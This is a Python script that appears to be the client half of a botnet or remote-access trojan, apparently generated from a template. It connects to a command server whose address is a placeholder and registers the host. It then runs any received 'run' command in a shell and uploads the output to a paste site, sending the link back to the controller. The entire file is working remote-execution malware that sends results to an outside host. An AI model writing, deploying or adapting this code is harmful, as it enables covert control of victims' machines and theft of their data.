import socket
import time
import datetime
import requests
from threading import Thread
import subprocess

ip_server = '{}'
port_server = '{}'
gb = 'https://ghostbin.co/paste/{}/raw'
# ip = requests.get(url='http://ipinfo.io/ip').text
ip = 'some random ip'
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    irc.connect((ip_server, int(port_server)))
except ConnectionRefusedError:
    print('can\'t connect, is server running ? check ip and port')
    exit(1)
irc.send(bytes('add {}\r\n'.format(ip), 'utf-8'))


def run(cmd):
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if len(proc.stderr) != 0:
        output = proc.stderr.replace(b' ', b'+')
        url = 'https://ghostbin.co/paste/new?lang=text&text={}&expire=-1&password=&title='.format(output.decode())
        upload = requests.post(url)
        id = (upload.history[0].headers['Location'].split('/'))[2]
        link = gb.format(id)
        irc.send(bytes('{}: {}\r\n'.format(ip, link), 'utf-8'))
        # err_lines = proc.stderr.decode().split('\n')
        # for line in err_lines:
        #     if len(line) == 0:
        #         continue
        #     irc.send(bytes('{}: {}\r\n'.format(ip, line), 'utf-8'))
    if len(proc.stdout) != 0:
        output = proc.stdout.replace(b' ', b'+')
        url = 'https://ghostbin.co/paste/new?lang=text&text={}&expire=-1&password=&title='.format(output.decode())
        upload = requests.post(url)
        id = (upload.history[0].headers['Location'].split('/'))[2]
        link = gb.format(id)
        irc.send(bytes('{}: {}\r\n'.format(ip, link), 'utf-8'))
        # output_lines = proc.stdout.decode().split('\n')
        # for line in output_lines:
        #     if len(line) == 0:
        #         continue
        #     irc.send(bytes('{}: {}\r\n'.format(ip, line), 'utf-8'))


while True:
    try:
        line = irc.recv(512)
        print(line.decode('utf-8'))
        if line.decode().find('run') != -1:
            cmd = line.decode().split(maxsplit=1)
            Thread(target=run, args=((cmd[1].strip('\n')).strip('\r'), )).start()
    except KeyboardInterrupt:
        break
    except:
        pass
